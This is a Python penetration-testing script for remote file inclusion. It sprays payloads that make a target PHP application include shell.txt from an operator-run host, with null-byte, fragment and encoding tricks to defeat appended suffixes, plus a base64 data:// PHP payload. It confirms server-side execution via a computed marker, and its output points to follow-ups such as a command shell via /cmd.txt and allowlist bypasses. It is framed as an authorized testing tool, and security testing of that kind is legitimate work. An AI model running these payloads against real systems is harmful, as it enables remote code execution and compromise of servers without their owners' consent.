#!/usr/bin/env python3
"""
rfi_probe.py — authorized RFI prober. Sprays remote-include payloads (schemes + suffix-defeats) plus the
data:// equivalent, and confirms EXECUTION by looking for a unique computed marker (RFI-EXEC-343), which
only appears if the target RAN the PHP — distinguishing RFI/RCE from a mere SSRF fetch.

Pair with payload_host.py (serve /shell.txt). Authorized testing only.

Usage:
  python3 rfi_probe.py -u "https://target/?page=FUZZ" --host http://YOUR_IP:8000
  python3 rfi_probe.py -u "https://target/?page=FUZZ" --data-only      # try data:// without a host
"""
import argparse, sys, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"
MARKER = "RFI-EXEC-343"   # = 7*7*7 ; only present if the hosted <?php echo 7*7*7; ?> executed
# base64 of <?php echo "RFI-EXEC-".(7*7*7); ?>
DATA_B64 = "PD9waHAgZWNobyAiUkZJLUVYRUMtIi4oNyo3KjcpOyA/Pg=="

def payloads(host):
    out = []
    if host:
        h = host.rstrip("/")
        out += [
            f"{h}/shell.txt",
            f"{h}/shell.txt?",        # ? swallows appended .php
            f"{h}/shell.txt%23",      # # fragment
            f"{h}/shell.txt%00",      # null byte
            f"{h}/shell.txt%253f",    # double-encoded ?
        ]
        # scheme swap
        if h.startswith("http://"):
            out.append("https://" + h[len("http://"):] + "/shell.txt?")
    # data:// equivalent (no host needed)
    out.append(f"data://text/plain;base64,{DATA_B64}")
    return out

def inject(url, payload):
    if "FUZZ" in url:
        return url.replace("FUZZ", up.quote(payload, safe=":/?=&%."))
    sep = "&" if "?" in url else "?"
    return url + sep + "page=" + up.quote(payload, safe=":/?=&%.")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="mark the include point with FUZZ")
    ap.add_argument("--host", help="your payload host base, e.g. http://1.2.3.4:8000")
    ap.add_argument("--data-only", action="store_true", help="only try data:// (no remote host)")
    ap.add_argument("--timeout", type=float, default=15)
    a = ap.parse_args()

    host = None if a.data_only else a.host
    if not host and not a.data_only:
        print("[!] no --host given; trying data:// only. (Stand up payload_host.py for remote-include tests.)")

    found = False
    for p in payloads(host):
        u = inject(a.url, p)
        try:
            r = requests.get(u, headers={"User-Agent": UA}, timeout=a.timeout, verify=False)
        except Exception as e:
            print(f"[err] {p[:60]}: {e}")
            continue
        if MARKER in r.text:
            print(f"[RFI/RCE] EXECUTION confirmed via:\n   {u}\n   -> response contains {MARKER} (7*7*7 ran on the server)")
            print("   NEXT: swap to /cmd.txt and add &c=id; report as RCE (Critical). Clean up. (§11/§19)")
            found = True
            break
        else:
            tag = "data://" if p.startswith("data:") else "remote"
            print(f"[..] no exec marker ({tag})  {u[:80]}")

    if not found:
        print("\n[*] No execution confirmed. Check your payload host got a hit (= fetch/SSRF, not RFI),")
        print("    try data:// / php://input / Windows UNC, defeat the suffix, or bypass a host allowlist (§6-§10).")
        print("    REMEMBER: a fetch with no execution is SSRF — report it in the SSRF kit, not as RFI.")

if __name__ == "__main__":
    main()
